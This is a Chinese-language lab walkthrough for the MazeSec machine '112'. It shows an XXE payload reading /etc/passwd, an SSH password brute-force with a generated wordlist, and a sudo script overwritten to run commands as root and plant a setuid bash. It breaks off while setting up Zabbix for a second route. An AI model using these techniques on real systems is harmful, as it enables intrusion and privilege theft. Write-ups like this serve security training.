src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">Maze-Sec 112<!----></h1>  <div class="theme-vdoing-content content__default"><h2 id="靶机信息"><a href="#靶机信息" class="header-anchor">#</a> 靶机信息</h2> <p>靶机名称：112<br>
靶机作者：ll104567/群主<br>
靶机类型：Linux<br>
难度：low-hard<br>
来源：MazeSec/QQ内部群 660930334<br>
官网：https://maze-sec.com/</p> <h2 id="目标主机"><a href="#目标主机" class="header-anchor">#</a> 目标主机</h2> <p>使用 arp-scan 扫描内网存活主机：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test1<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> arp-scan <span class="token parameter variable">-I</span> eth2 <span class="token number">192.168</span>.6.0/24

<span class="token number">192.168</span>.6.215   08:00:27:5c:0a:80       PCS Systemtechnik GmbH
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>目标主机 IP：192.168.1.10</p> <h2 id="端口扫描"><a href="#端口扫描" class="header-anchor">#</a> 端口扫描</h2> <p>使用 nmap 进行 TCP 全端口扫描：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ nmap <span class="token number">192.168</span>.1.10 -p- <span class="token parameter variable">-sT</span> <span class="token parameter variable">-sV</span>

PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span>+deb11u3 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.62 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>发现开放了 22/ssh、80/http 端口</p> <h2 id="_80-端口服务探测"><a href="#_80-端口服务探测" class="header-anchor">#</a> 80 端口服务探测</h2> <p>访问 80 端口，展示了一个 xml 解析的页面：</p> <p><img src="/medias/maze-112/1.png" alt=""></p> <p>尝试输入 xml 内容进行解析，测试是否存在 XXE 漏洞：</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> 
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>页面存在 XXE 漏洞，成功读取 /etc/passwd 文件：</p> <p><img src="/medias/maze-112/2.png" alt=""></p> <p>可以看到存在登录 shell 的用户 tuf，以及 tuf 用户后的几个服务用户</p> <p>在 /etc/passwd 文件里，tuf 用户行存在注释 <code>KQNPHFqG**JHcYJossIe</code>，猜测可能是密码线索，两位掩码</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="爆破-tuf-用户密码"><a href="#爆破-tuf-用户密码" class="header-anchor">#</a> 爆破 tuf 用户密码</h2> <p>使用 python 脚本生成所有可能的两位字母数字组合，爆破 tuf 用户密码：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># file: generate_passwords.py</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">generate_passwords</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 配置信息</span>
    base_pwd <span class="token operator">=</span> <span class="token string">&quot;KQNPHFqG**JHcYJossIe&quot;</span>
    output_file <span class="token operator">=</span> <span class="token string">&quot;pass.txt&quot;</span>
    <span class="token comment"># 字符集：a-z, A-Z, 0-9</span>
    charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits     
    <span class="token comment"># 计算所有 2 位组合 (62 * 62 = 3844)</span>
    combinations <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;正在生成密码并写入 </span><span class="token interpolation"><span class="token punctuation">{</span>output_file<span class="token punctuation">}</span></span><span class="token string">...&quot;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            count <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">for</span> combo <span class="token keyword">in</span> combinations<span class="token punctuation">:</span>
                <span class="token comment"># 拼接两个掩码字符</span>
                replacement <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>combo<span class="token punctuation">)</span>
                <span class="token comment"># 替换原始字符串中的 **</span>
                new_password <span class="token operator">=</span> base_pwd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;**&quot;</span><span class="token punctuation">,</span> replacement<span class="token punctuation">)</span>
                <span class="token comment"># 写入文件并换行</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_password <span class="token operator">+</span> <span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span>
                count <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;成功！已生成 </span><span class="token interpolation"><span class="token punctuation">{</span>count<span class="token punctuation">}</span></span><span class="token string"> 个密码到 </span><span class="token interpolation"><span class="token punctuation">{</span>output_file<span class="token punctuation">}</span></span><span class="token string">。&quot;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;写入失败: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    generate_passwords<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>使用 hydra 指定密码字典对 tuf 用户进行爆破：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ python3 bp.py 
正在生成密码并写入 pass.txt<span class="token punctuation">..</span>.
成功！已生成 <span class="token number">3844</span> 个密码到 pass.txt。

┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ hydra <span class="token parameter variable">-l</span> tuf <span class="token parameter variable">-P</span> pass.txt ssh://192.168.1.10 <span class="token parameter variable">-e</span> nsr
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="/medias/maze-112/3.png" alt=""></p> <p>爆破出 tuf 用户密码为 <code>KQNPHFqG6mJHcYJossIe</code></p> <h2 id="sudo-提权"><a href="#sudo-提权" class="header-anchor">#</a> sudo 提权</h2> <h2 id="方案一-ta0方案-路径解析利用"><a href="#方案一-ta0方案-路径解析利用" class="header-anchor">#</a> 方案一：ta0方案（路径解析利用）</h2> <h3 id="_1-1、sudo-脚本分析"><a href="#_1-1、sudo-脚本分析" class="header-anchor">#</a> 1.1、sudo 脚本分析</h3> <p>使用爆破出的密码登录 tuf 用户，tuf 用户可以 sudo 权限执行 /opt/112.sh</p> <p><img src="/medias/maze-112/4.png" alt=""></p> <p>脚本内容：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>tuf@112:~$ <span class="token function">cat</span> /opt/112.sh 
<span class="token comment">#!/bin/bash</span>
<span class="token assign-left variable">input_url</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token assign-left variable">output_file</span><span class="token operator">=</span><span class="token string">&quot;&quot;</span>
<span class="token assign-left variable">use_file</span><span class="token operator">=</span>false
<span class="token assign-left variable">regex</span><span class="token operator">=</span><span class="token string">'^https://maze-sec.com/[a-zA-Z0-9/]*$'</span>
<span class="token keyword">while</span> <span class="token builtin class-name">getopts</span> <span class="token string">&quot;:u:o:&quot;</span> opt<span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token keyword">case</span> <span class="token variable">${opt}</span> <span class="token keyword">in</span>
        u<span class="token punctuation">)</span> <span class="token assign-left variable">input_url</span><span class="token operator">=</span><span class="token string">&quot;<span class="token variable">$OPTARG</span>&quot;</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
        o<span class="token punctuation">)</span> <span class="token assign-left variable">output_file</span><span class="token operator">=</span><span class="token string">&quot;<span class="token variable">$OPTARG</span>&quot;</span><span class="token punctuation">;</span> <span class="token assign-left variable">use_file</span><span class="token operator">=</span>true <span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token punctuation">\</span>?<span class="token punctuation">)</span> <span class="token builtin class-name">echo</span> <span class="token string">&quot;错误: 无效选项 -<span class="token variable">$OPTARG</span>&quot;</span><span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token builtin class-name">echo</span> <span class="token string">&quot;错误: 选项 -<span class="token variable">$OPTARG</span> 需要一个参数&quot;</span><span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
    <span class="token keyword">esac</span>
<span class="token keyword">done</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">&quot;<span class="token variable">$input_url</span>&quot;</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;错误: 必须使用 -u 参数提供URL&quot;</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">&quot;<span class="token variable">$input_url</span>&quot;</span> <span class="token operator">=~</span> ^https://maze-sec.com/ <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;错误: URL必须以 https://maze-sec.com/ 开头&quot;</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">&quot;<span class="token variable">$input_url</span>&quot;</span> <span class="token operator">=~</span> <span class="token variable">$regex</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;错误: URL包含非法字符，只允许字母、数字和斜杠&quot;</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span> RANDOM <span class="token operator">%</span> <span class="token number">2</span> <span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token assign-left variable">result</span><span class="token operator">=</span><span class="token string">&quot;<span class="token variable">$input_url</span> is a good url.&quot;</span>
<span class="token keyword">else</span>
    <span class="token assign-left variable">result</span><span class="token operator">=</span><span class="token string">&quot;<span class="token variable">$input_url</span> is not a good url.&quot;</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">&quot;<span class="token variable">$use_file</span>&quot;</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;<span class="token variable">$result</span>&quot;</span> <span class="token operator">&gt;</span> <span class="token string">&quot;<span class="token variable">$output_file</span>&quot;</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;结果已保存到: <span class="token variable">$output_file</span>&quot;</span>
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;<span class="token variable">$result</span>&quot;</span>
<span class="token keyword">fi</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>通过注释或分析脚本可以知道脚本的功能：接受一个 URL 参数 <code>-u</code>，并判断 URL 是否符合要求，然后输出随机结果，若指定了 <code>-o</code> 参数则将结果写入文件，url 部分可控，任意文件覆盖。</p> <h3 id="_1-2、前置内容补充"><a href="#_1-2、前置内容补充" class="header-anchor">#</a> 1.2、前置内容补充</h3> <p>补充一些过渡内容：</p> <ul><li>1、unix 路径中如果存在多个 <code>/</code> 等价于单个 <code>/</code>，例如 <code>/opt//112.sh</code> 等价于 <code>/opt/112.sh</code>。</li> <li>2、在 Linux 中，目录名和文件名几乎可以使用任何字符（除了 <code>/</code> 和 null 字符），包括空格、制表符、换行符以及其他特殊字符都是允许的。</li> <li>3、当 sudo/ shell 尝试执行一个无 shebang 的可执行文本文件时，底层 execve 返回ENOEXEC，调用方通常会退回用 /bin/sh（或其指定的 shell）来解释执行该文件。</li></ul> <p>这里在引出 ta0 方案：</p> <p>如果命令名包含 /，shell 会将其视为路径（绝对或相对）直接执行，而不会在 $PATH 中查找；若为相对路径，则以当前工作目录为基准解析。</p> <p>核心原理：</p> <p>这个脚本的 -o 参数允许我们将验证结果（如 https://maze-sec.com/111 is a good url.）写入任意文件。</p> <ul><li>1、如果我们利用这一特性，将结果覆盖脚本自身（/opt/112.sh），旧的脚本内容（包括 #!/bin/bash）就会丢失。</li> <li>2、当我们再次 sudo 执行该脚本时，Shell 读取到的第一行代码变成了以 https:// 开头的字符串。</li> <li>3、由于该字符串包含 /，Shell 会将其视为相对路径命令执行，即尝试在当前目录下寻找 https: 文件夹下的 maze-sec.com 文件夹下的 111 可执行文件。</li> <li>4、只要我们提前在当前目录构建好这个文件夹结构并放入恶意文件，即可实现 Root 权限命令执行。</li></ul> <h3 id="_1-3、路径解析利用"><a href="#_1-3、路径解析利用" class="header-anchor">#</a> 1.3、路径解析利用</h3> <p>例如下面，这里就是一个相对路径，<code>https://maze-sec.com/111</code> 会被解析为当前目录下的 <code>https:/maze-sec.com/111</code> 文件并执行，后面的 <code>is a good url.</code> 会被当作参数传递给该脚本：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>https://maze-sec.com/111 is a good url.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>测试：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>tuf@112:~$ <span class="token builtin class-name">echo</span> <span class="token string">'https://maze-sec.com/111 is a good url.'</span> <span class="token operator">&gt;</span> test.sh
tuf@112:~$ <span class="token function">chmod</span> +x test.sh 
tuf@112:~$ ./test.sh 
./test.sh: line <span class="token number">1</span>: https://maze-sec.com/111: No such <span class="token function">file</span> or directory
tuf@112:~$ <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">'https://maze-sec.com/'</span>
tuf@112:~$ <span class="token builtin class-name">echo</span> <span class="token string">'whoami'</span> <span class="token operator">&gt;</span> https<span class="token punctuation">\</span>:/maze-sec.com/111
tuf@112:~$ <span class="token function">chmod</span> +x https<span class="token punctuation">\</span>:/maze-sec.com/111 
tuf@112:~$ ./test.sh 
tuf
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="/medias/maze-112/5.png" alt=""></p> <p>成功执行了 https://maze-sec.com/111 脚本，输出 tuf 用户名</p> <p>如果把 <code>https://maze-sec.com/111 is a good url.</code> 输出覆盖 /opt/112.sh 脚本，再用 sudo 执行，通过修改 111 文件内容就可以实现任意命令执行。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>tuf@112:~$ <span class="token function">sudo</span> /opt/112.sh <span class="token parameter variable">-o</span> /opt/112.sh <span class="token parameter variable">-u</span> https://maze-sec.com/111
结果已保存到: /opt/112.sh
tuf@112:~$ <span class="token function">cat</span> /opt/112.sh 
https://maze-sec.com/111 is a good url.
tuf@112:~$ <span class="token function">sudo</span> /opt/112.sh 
root
tuf@112:~$ <span class="token builtin class-name">echo</span> <span class="token string">'cp /bin/bash /tmp/bash;chmod +s /tmp/bash'</span> <span class="token operator">&gt;</span> https<span class="token punctuation">\</span>:/maze-sec.com/111 
tuf@112:~$ <span class="token function">sudo</span> /opt/112.sh 
tuf@112:~$ <span class="token function">ls</span> <span class="token parameter variable">-alh</span> /tmp/bash
-rwsr-sr-x <span class="token number">1</span> root root <span class="token number">1</span>.2M Jan <span class="token number">16</span> <span class="token number">11</span>:37 /tmp/bash
tuf@112:~$ /tmp/bash <span class="token parameter variable">-p</span>
bash-5.0<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tuf<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tuf<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>tuf<span class="token punctuation">)</span>
bash-5.0<span class="token comment"># </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p><img src="/medias/maze-112/6.png" alt=""></p> <h2 id="方案二-毛坯房方案"><a href="#方案二-毛坯房方案" class="header-anchor">#</a> 方案二：毛坯房方案</h2> <p>毛坯房方案：靶机作者构建了预期提权利用链，靶机部署环节部分留空，需要选手自行补全实现漏洞环境利用。</p> <p>在 sudoers.d 目录下，有 sudo 授权配置文件 zabbix 且可读</p> <p><img src="/medias/maze-112/7.png" alt=""></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>tuf@112:~$ <span class="token function">cat</span> /etc/sudoers.d/zabbix 
zabbix ALL <span class="token operator">=</span> <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/nmap <span class="token parameter variable">-O</span> *
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>zabbix 用户可以无密码 sudo 执行 nmap 的 -O 参数进行操作系统探测功能。</p> <p>那么提权问题就变成了如何上线 zabbix 用户的问题，在进程里也没有看到 zabbix 相关服务。</p> <p><a href="https://www.zabbix.com/documentation/7.0/zh/manual/installation" target="_blank" rel="noopener noreferrer">zabbix 官方文档 - 安装<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/maze-112/8.png" alt=""></p> <h2 id="_2-1、环境补充与-web-部署"><a href="#_2-1、环境补充与-web-部署" class="header-anchor">#</a> 2.1、环境补充与 Web 部署</h2> <p>检查靶机是否注册了 zabbix 服务，zabbix 服务启动失败</p> <p><img src="/medias/maze-112/9.png" alt=""></p> <p>收集靶机 zabbix 服务相关信息</p> <p><img src="/medias/maze-112/10.png" alt=""></p> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code><span class="token key attr-name">DBHost</span><span class="token punctuation">=</span><span class="token value attr-value">localhost</span>
<span class="token key attr-name">DBName</span><span class="token punctuation">=</span><span class="token value attr-value">zabbix</span>
<span class="token key attr-name">DBUser</span><span class="token punctuation">=</span><span class="token value attr-value">zabbix</span>
<span class="token key attr-name">DBPassword</span><span class="token punctuation">=</span><span class="token value attr-value">your_strong_password</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>zabbix 配置文件内的 mysql 密码正确，数据库为空</p> <p><img src="/medias/maze-112/11.png" alt=""></p> <p>查看 zabbix 配置文件里的 日志文件内容</p> <p><img src="/medias/maze-112/12.png" alt=""></p> <p>可以确定zabbix-server 已安装并尝试启动，但日志提示 zabbix.users 表不存在并判定 “database is not a Zabbix database”，说明数据库未导入 Zabbix 初始化 schema/data，导致服务端无法运行</p> <p>另外还可以知道 zabbix-server 版本<code>Zabbix 5.0.8 (revision d3c78f993a)</code></p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>5297:20260108:061706.794 [Z3005] query failed: [1146] Table 'zabbix.users' doesn't exist [select userid from users limit 1]
5297:20260108:061706.794 cannot use database &quot;zabbix&quot;: database is not a Zabbix database
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>找到 zabbix-server 5.0.8 版本的初始化数据库文件，使用 zcat 命令直接把 .gz 压缩文件解压后输出到标准输出，再通过管道传递给 mysql 命令导入到 zabbix 数据库中：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 重新构建数据库</span>
mysql <span class="token parameter variable">-u</span> zabbix -p<span class="token string">'your_strong_password'</span> <span class="token parameter variable">-e</span> <span class="token string">&quot;DROP DATABASE zabbix; CREATE DATABASE zabbix CHARACTER SET utf8 COLLATE utf8_bin;&quot;</span>
<span class="token comment">#导入数据库</span>
zcat /usr/share/zabbix-server-mysql/<span class="token punctuation">{</span>schema,images,data<span class="token punctuation">}</span>.sql.gz <span class="token operator">|</span> mysql <span class="token parameter variable">-u</span> zabbix -p<span class="token string">'your_strong_password'</span> zabbix
